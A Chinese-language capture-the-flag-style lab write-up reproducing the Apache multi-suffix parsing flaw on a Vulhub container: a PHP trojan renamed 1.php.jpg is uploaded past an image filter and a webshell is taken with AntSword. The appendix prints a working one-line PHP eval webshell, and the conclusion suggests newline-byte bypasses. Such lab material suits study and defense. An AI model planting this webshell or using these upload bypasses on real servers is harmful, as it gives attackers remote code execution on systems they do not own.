# 一、概述
* 什么是多后缀解析漏洞，简而言之就是，客户端提交的文件名后缀名可能是`xxx.php.jpg`但是一样会解析成`php`，一个文件名拥有多个后缀，但是攻击者可以利用后缀解析错误，达到想要上传的文件类型。
* 例如：以下配置文件：其给.html后缀增加了`text/html`，给.cn后缀增加了`zh-CN`。此时如果用户了请求文件为`index.cn.html`,他将会返回一个中文的html页面
```
AddType text/html .html
AddLanguage zh-CN .cn
```
* 在以上特性上，如果服务提供者给`.php`后缀增加了处理器，例如在下面的配置中增加了.php的处理，那么在有多个后缀的情况下，只有有一个文件含有`.php`的后缀的文件都将会被识别为PHP文件，即使你的文件是多个后缀，都没有用，PHP依然执行，攻击者往往可以利用这样一个漏洞实现绕过上传白名单的解析漏洞
```
AddHandler application/x-httpd-php .php
```

# 二、影响版本
* 所有版本，因为这些都是配置上的错误导致的漏洞

# 三、靶场复现
* 这是我使用的是`Vulhub`线下靶场进行的复现
```
root@wq:/home/wq/vulhub-master/httpd/apache_parsing_vulnerability# ls
1.png  2.png  conf  docker-compose.yml  README.md  start.sh  www
root@wq:/home/wq/vulhub-master/httpd/apache_parsing_vulnerability# pwd
/home/wq/vulhub-master/httpd/apache_parsing_vulnerability
root@wq:/home/wq/vulhub-master/httpd/apache_parsing_vulnerability# docker-compose up -d
root@wq:/home/wq/vulhub-master/httpd/apache_parsing_vulnerability# docker ps
CONTAINER ID   IMAGE        COMMAND                  CREATED          STATUS          PORTS                               NAMES
b70540373943   php:apache   "docker-php-entrypoi…"   30 seconds ago   Up 29 seconds   0.0.0.0:80->80/tcp, :::80->80/tcp   apache_parsing_vulnerability_apache_1
root@wq:/home/wq/vulhub-master/httpd/apache_parsing_vulnerability# 
```
* 靶场环境验证
* 访问：`http://192.168.10.134:80/`,访问成功
![图 15](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-170144486.png)  

# 四、漏洞复现
* 发现漏洞过程：
    * 中间件类型：`apache`版本为：2.4.49
    ![图 14](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-170129842.png)  
    * 开启`BP`进行抓包
    ![图 16](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-170252587.png)  
    * 选择一个文件类型尝试上传，观察效果
    ![图 17](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-170416337.png)  
    ![图 18](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-170522394.png) 
    * 因为txt文件格式上传失败了，这是就猜测可以做了一些过滤，或者需要指定一个文件类型进行上传，现在假设我们在登录后，需要上传一个图标表示自己的用户图面，可能是要求是一个`jpg`格式的文件，在这种场景下我们去上传一个`.jpg`的文件 
    ![图 19](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-171351683.png)
    * 虽然可以上传jpg或者png的格式文件，但是实际上我想要的是可以上传一个php的脚本文件，用来拿到`webshell`，所以想到既然`JPG`的格式文件可以上传成功，但是apache可能也存在`php`的解析问题，此时我利用文件名，多后缀名的方式进行上传php木马文件进行测试。将文件名改成`1.php.jpg`并将文件内容改为：php木马，再次进行上传进行测试
    ![图 21](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-171946947.png) 
    * 常使用中国蚁剑开始进行`WebShell获取`，发现成功获取`WebShell`
    ![图 22](.images/%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/IMG_20220116-172805987.png)  

# 五、附录
* PHP一句话木马
``` PHP
<?php
    $a=$_POST['H'];
    eval("$a");
?>  
```

# 总结：
* 当我们已经找到了上传点时，就需要考虑如何可以将自己的木马文件进行上传，这里在看到apache版本比较低的时候，我们也要去联想到可以使用换行解析错误的原理，进行尝试插入字节`0a`当然，若果绕不过文件过滤这是再考虑其他的方式，例如这一次的后缀名解析错误
* 对于这种绕过的方式：换行符解析错误、后缀名解析错误进行绕过校验

